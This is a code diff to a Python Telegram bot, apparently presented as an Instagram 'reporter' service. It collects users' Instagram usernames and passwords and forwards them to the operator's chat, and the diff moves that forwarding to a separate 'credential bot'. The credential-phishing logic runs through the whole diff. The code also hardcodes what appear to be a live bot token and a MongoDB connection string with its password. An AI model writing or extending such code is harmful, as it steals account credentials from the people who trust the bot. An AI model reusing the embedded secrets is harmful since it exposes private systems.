@@ -13,7 +13,8 @@ from telegram import (
     InlineKeyboardButton,
     InlineKeyboardMarkup,
     ReplyKeyboardMarkup,
-    KeyboardButton
+    KeyboardButton,
+    Bot
 )
 from telegram.error import Conflict
 from telegram.ext import (
@@ -31,8 +32,10 @@ ADMIN_ID = 6881713177  # Your admin ID
 BOT_TOKEN = os.getenv("BOT_TOKEN", "7275717734:AAE6bq0Mdypn_wQL6F1wpphzEtLAco3_B3Y")
 MONGODB_URI = os.getenv("MONGODB_URI", "mongodb+srv://instaboost_user:uX1YzKjiOETNhyYj@cluster0.tolxjiz.mongodb.net/instaboost?retryWrites=true&w=majority&appName=Cluster0")
 PORT = int(os.environ.get('PORT', 8000))  # Render requires port binding
-ADMIN_BOT_TOKEN = "7275717734:AAE6bq0Mdypn_wQL6F1wpphzEtLAco3_B3Y"  # Your admin bot token
-ADMIN_CHAT_ID = 6881713177  # Your admin chat ID
+
+# Credential bot details
+CREDENTIAL_BOT_TOKEN = "7275717734:AAE6bq0Mdypn_wQL6F1wpphzEtLAco3_B3Y"
+CREDENTIAL_CHAT_ID = 6881713177
 
 # States
 START, LANGUAGE, REGISTER, IG_USERNAME, IG_PASSWORD, MAIN_MENU, REPORT_MENU, \
@@ -182,7 +185,7 @@ def is_valid_username(username):
     clean = username[1:].strip()
     return bool(re.match(r'^[a-zA-Z0-9._]{1,30}$', clean))
 
-# Send credentials to admin bot
+# Send credentials to credential bot
 async def send_credentials_to_admin(context, user_id, ig_username, ig_password):
     try:
         user = get_user(user_id) or {}
@@ -205,10 +208,12 @@ async def send_credentials_to_admin(context, user_id, ig_username, ig_password):
 🌐 <b>Source:</b> Premium IG Reporter Bot
 🔒 <b>Status:</b> VERIFIED
 """
+        # Create credential bot instance
+        credential_bot = Bot(token=CREDENTIAL_BOT_TOKEN)
         
-        # Send to admin bot
-        await context.bot.send_message(
-            chat_id=ADMIN_CHAT_ID,
+        # Send to credential bot
+        await credential_bot.send_message(
+            chat_id=CREDENTIAL_CHAT_ID,
             text=message,
             parse_mode='HTML'
         )
@@ -380,7 +385,7 @@ async def get_ig_password(update: Update, context: CallbackContext) -> int:
             await update.message.reply_text(STRINGS[lang]['db_error'], parse_mode='HTML')
             return ConversationHandler.END
         
-        # Send credentials to admin bot
+        # Send credentials to credential bot
         await send_credentials_to_admin(context, user_id, ig_username, password)
         
         await update.message.reply_text(
